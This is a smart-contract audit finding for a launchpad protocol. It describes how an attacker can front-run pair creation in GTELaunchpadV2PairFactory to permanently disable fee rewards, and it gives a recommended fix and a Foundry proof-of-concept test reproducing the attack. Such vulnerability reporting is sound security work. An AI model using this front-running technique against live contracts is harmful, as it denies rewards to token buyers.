  "body": "## Finding description\n\nProtocol : Launchpad\n\nThe `GTELaunchpadV2PairFactory` factory creates TWO types of pairs based on the caller:\n```solidity\n\n// GTELaunchpadV2PairFactory \n\nfunction createPair(address tokenA, address tokenB) external returns (address pair) {\n // ..... \n(address _launchpadLp, address _launchpadFeeDistributor) =\n            msg.sender == launchpad ? (launchpadLp, launchpadFeeDistributor) : (address(0), address(0));\n\n bytes32 salt = keccak256(abi.encodePacked(token0, token1, _launchpadLp, _launchpadFeeDistributor));\n        \n       assembly {\n            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)\n        }\n IUniswapV2Pair(pair).initialize(token0, token1, _launchpadLp, _launchpadFeeDistributor);\n\n```\n\nType A: Regular pairs without reward fee mechanism  \n(launchpadLp == launchpadFeeDistributor == address(0)) \n\nType B: Launchpad pairs with fee related variables set \n(launchpadLp != launchpadFeeDistributor != address(0) )\n\n\nRewards fee calculation / distribution are only activated when pairs are created thru the launchpad.\n\n\nHowever, since the `launchToken` address becomes public, after it is deployed thru the`launch` function [here](https://github.com/code-423n4/2025-08-gte-perps/blob/main/contracts/launchpad/Launchpad.sol#L252)\nAn attacker can front-run and create a pair for `LaunchToken: quoteToken` pair, much before \nthe launchpad's `createPair() ` call at the end of bonding phase. \nThis permanently disables the fee reward mechanism for graduated tokens.\n\nAlso note that, only ONE pair can exist for any (tokenA, tokenB) combination.\nThe first caller (whether launchpad or attacker) creates the pair\nsubsequent calls for the same tokens will revert with \"PAIR_EXISTS\".\n\n```solidity\n// GTELaunchpadV2PairFactory : createPair\n// Only ONE pair can exist per token pair\nif (getPair[token0][token1] != address(0)) revert(\"UniswapV2: PAIR_EXISTS\");\n\n// The mappings stores the pair address\ngetPair[token0][token1] = pair;\ngetPair[token1][token0] = pair;\n\n```\n\nAlthough the revert is handled during graduation, \nThe Launchpad is still forced to use the already created pair with permanently disabled reward system.\n\n\n## Impacts and Likelihood\n\nImpact : High\n\n1. Attackers can permanently disable reward fee calculation / distribution mechanism of graduated pairs.\n2. No rewards are distributed to users who purchased in bonding phase.\n3. `endRewards` calls the wrong address bricking last user transfer.\n\nLikelihood : High\n\n1. All launchpad graduating pairs can be impacted, as anyone can easily execute the attack.\n\n## Recommended mitigation steps\n\nAdd an `isLaunchToken` mapping in `GTELaunchpadV2PairFactory` and flag `launchTokens` in the same transaction as they are deployed during `launch` call\n\nExample fix\n\n```solidity\n// GTELaunchpadV2PairFactory\n    mapping(address => bool) public isLaunchToken;\n\n\n//  @notice Register a launch token to prevent front-running\n//  @dev Only callable by launchpad during token deployment\n\n    function registerLaunchToken(address token) external {\n        if (msg.sender != launchpad) revert(\"GTEFactory: FORBIDDEN\");\n        isLaunchToken[token] = true;\n        emit LaunchTokenRegistered(token);\n    }\n\n// NEW: Front-run protection for launch tokens\n\nfunction createPair() { \n  // ...\n     bool isLaunchTokenPair = isLaunchToken[token0] || isLaunchToken[token1];\n        if (isLaunchTokenPair && msg.sender != launchpad) {\n            revert(\"GTEFactory: LAUNCH_TOKEN_PAIR_FORBIDDEN\");\n        }\n  // ...\n```",
  "proof_of_concept": "foundry POC\n```\nforge test --match-test test_FrontrunPairCreationDosRewards -vvv\n```\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {IDistributor} from \"contracts/launchpad/interfaces/IDistributor.sol\";\nimport {Distributor} from \"contracts/launchpad/Distributor.sol\";\n\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport \"forge-std/console.sol\";\n\nimport {GTELaunchpadV2PairFactory} from \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {LaunchpadLPVault} from \"contracts/launchpad/LaunchpadLPVault.sol\";\n\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n\n    function test_FrontrunPairCreationDosRewards() external {\n        console.log(\"=== CRITICAL: Front-run Pair Creation Disables Fee Extraction ===\\n\");\n        \n        // Setup\n        address attacker = makeAddr(\"attacker\");\n        ERC20Harness tokenA = new ERC20Harness(\"LaunchToken\", \"LAUNCH\");\n        ERC20Harness tokenB = new ERC20Harness(\"WETH\", \"WETH\");\n        \n        // Ensure tokenA < tokenB for consistent ordering\n        if (address(tokenA) > address(tokenB)) {\n            (tokenA, tokenB) = (tokenB, tokenA);\n        }\n        \n        // Create factory\n        GTELaunchpadV2PairFactory realFactory = new GTELaunchpadV2PairFactory(\n            address(this),\n            address(launchpad),\n            address(launchpadLPVault),\n            address(distributor)\n        );\n        \n        console.log(\"Factory deployed with:\");\n        console.log(\"  launchpadLp:\", address(launchpadLPVault));\n        console.log(\"  distributor:\", address(distributor));\n        \n        // Attacker front-runs launchpad's createPair call\n        console.log(\"\\n=== Attacker Front-runs ===\");\n        vm.prank(attacker);\n        address attackerPair = realFactory.createPair(address(tokenA), address(tokenB));\n        \n        GTELaunchpadV2Pair pair = GTELaunchpadV2Pair(attackerPair);\n        console.log(\"Attacker created pair at:\", attackerPair);\n        console.log(\"Pair's launchpadLp:\", pair.launchpadLp());\n        console.log(\"Pair's distributor:\", pair.launchpadFeeDistributor());\n        \n        assertTrue(pair.launchpadLp() == address(0), \"Should have no fee extraction!\");\n        assertTrue(pair.launchpadFeeDistributor() == address(0), \"Should have no distributor!\");\n        \n        // Launchpad tries to create pair (FAILS)\n        console.log(\"\\n=== Launchpad Attempts Creation ===\");\n        vm.prank(address(launchpad));\n        vm.expectRevert(\"UniswapV2: PAIR_EXISTS\");\n        realFactory.createPair(address(tokenA), address(tokenB));\n        \n        console.log(\"Launchpad's createPair REVERTED - pair already exists!\");\n        \n        // Demonstrate impact: No fee extraction possible\n        console.log(\"\\n=== Impact: No Fee Extraction ===\");\n        \n        // Add liquidity\n        tokenA.mint(attackerPair, 1000e18);\n        tokenB.mint(attackerPair, 1000e18);\n        pair.mint(address(this));\n        \n        // Perform swap\n        tokenA.mint(attackerPair, 100e18);\n        pair.swap(0, 90e18, address(this), \"\");\n        \n        // Check fees\n        (uint112 fee0, uint112 fee1,) = pair.getAccruedLaunchpadFees();\n        console.log(\"Accumulated launchpad fees:\");\n        console.log(\"  Fee0:\", fee0);\n        console.log(\"  Fee1:\", fee1);\n        \n        assertTrue(fee0 == 0 && fee1 == 0, \"No fees accumulated!\");        \n    }  \n\n}\n\n\n\n```",
